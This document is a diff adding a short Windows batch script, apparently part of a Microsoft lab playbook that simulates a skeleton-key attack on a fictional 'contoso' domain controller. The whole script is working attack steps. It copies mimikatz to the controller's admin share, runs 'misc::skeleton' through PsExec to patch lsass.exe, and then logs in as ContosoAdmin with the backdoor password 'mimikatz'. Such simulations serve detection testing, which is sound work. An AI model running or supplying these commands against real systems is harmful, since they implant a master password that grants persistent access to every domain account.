@@ -1,0 +1,15 @@
+:: Copyright (c) Microsoft Corporation.  
+:: Licensed under the MIT license.
+
+:: in NuckC cmd... copy files to DC
+xcopy c:\tools\mimikatz\x64\mimikatz.exe \\contosodc\c$\temp\
+pause
+:: execute skeleton key attack (patch lsass.exe on DC)
+c:\tools\SysinternalsSuite\PsExec.exe \\contosodc -accepteula cmd /c (cd c:\temp ^& mimikatz.exe "privilege::debug" "misc::skeleton" ^& "exit")
+pause
+:: map drive using ContosoAdmin
+:: first, wrong password
+net use k: \\contosodc\c$ wrongPassword /user:ContosoAdmin@contoso.azure
+pause
+net use k: \\contosodc\c$ mimikatz /user:ContosoAdmin@contoso.azure
+pause
